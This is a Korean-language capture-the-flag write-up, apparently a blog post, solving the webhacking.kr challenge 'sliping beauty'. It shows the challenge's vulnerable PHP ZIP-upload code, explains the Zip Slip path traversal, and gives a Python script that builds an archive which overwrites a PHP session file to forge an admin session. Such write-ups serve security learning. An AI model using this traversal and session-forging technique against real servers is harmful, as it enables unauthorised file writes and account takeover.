---
title: ["[Webhacking.kr] sliping beauty (PHP - 200)"]
date: 2024-12-01 09:00:00 +0900
categories: [writeup, webhacking.kr]
tags: [web, php, zip slip, file upload]
---

```php
<?php
session_start();
if(!$_SESSION['uid']) $_SESSION['uid'] = "guest";
if($_SESSION['uid'] == "admin") include "/flag";
if($_FILES['upload']){
  $path = $_FILES['upload']['tmp_name'];
  $zip = new ZipArchive;
  if ($zip->open($_FILES['upload']['tmp_name']) === true){
    for($i = 0; $i < $zip->numFiles; $i++){
      $filename = $zip->getNameIndex($i);
      $filename_ = $filename.rand(10000000,99999999);
      if(strlen($filename) > 240) exit("file name too long");
      if(preg_match('/[\x00-\x1F\x7F-\xFF]/',$filename)) exit("no hack");
      if(copy("zip://{$_FILES['upload']['tmp_name']}#{$filename}", "./upload/{$filename_}")) echo "{$filename_} uploaded.<br>";
      else echo "{$filename_} upload failed.<br>";
    }
    $zip->close();
  }
}
highlight_file(__FILE__);
?>
```

세션이 시작되고 uid가 없으면 "guest"로 설정된다.  
uid가 `admin`이면, flag파일을 include한다.  

zip 파일을 업로드받아 처리하는데, 각 파일에 대해 랜덤한 숫자를 붙여 새 파일명을 만든다.  

파일명은 240자를 넘을 수 없고, `0x00`-`0x1F` 사이의 문자를 포함할 수 없다.  

메인 코드와 문제의 제목으로 미루어보아,  
Zip Slip 취약점을 사용하는 문제인 것 같다.  


### Zip Slip 취약점
Zip Slip은 ZIP 아카이브를 처리할 때 발생하는 Path Traversal 취약점의 한 종류이다.  

1. 작동 원리:
  * ZIP 파일 내부에 `../`와 같은 상대 경로를 포함한 파일명을 넣는다.
  * 압축 해제 시 이 경로를 제대로 검증하지 않으면 의도한 디렉토리 외부에 파일을 쓸 수 있다.

2. 예시:
```
test.zip
  └── ../../../attack.php
```

이런 구조의 ZIP 파일을 업로드하면,  
```
/var/www/html/upload/  (업로드 디렉토리)
/var/www/attack.php    (실제 저장은 상위 디렉토리로 이동)
```


해당 취약점을 이용해서 세션 파일을 조작할 수 있다.  

PHP의 세션 파일은 기본적으로 `/tmp` 또는 `/var/lib/php/sessions` 디렉토리에 `sess_[SESSION_ID]` 형식으로 저장된다.  
서버의 php코드에서 파일명 뒤에 랜덤한 숫자를 부여해주므로, 해당 숫자를 `SESSION_ID`로 사용할 수 있다.  

```python
import zipfile

zip_name = "exploit.zip"
session_path = "../../../../../../var/lib/php/sessions/sess_" 
session_content = "uid|s:5:\"admin\";"  

with zipfile.ZipFile(zip_name, 'w') as zf:
    zf.writestr(session_path, session_content)
```

python을 실행해서 생성된 zip 파일을 서버에 올리고, `sess_` 뒤의 랜덤한 8자리 숫자를 `SESSION_ID`로 하여 페이지에 접속하면 FLAG가 나온다.  


### 시행착오
처음에 문제를 접근할때, `/flag`파일에 대한 심볼릭 링크 파일을 생성해서 업로드했는데 풀리지 않았다.  
이는 PHP의 `copy()`함수의 특성 때문인데,  
PHP `copy()`함수는 심볼릭 링크를 따라가지 않고 파일의 메타데이터만 복사하는 로우레벨 연산을 수행한다.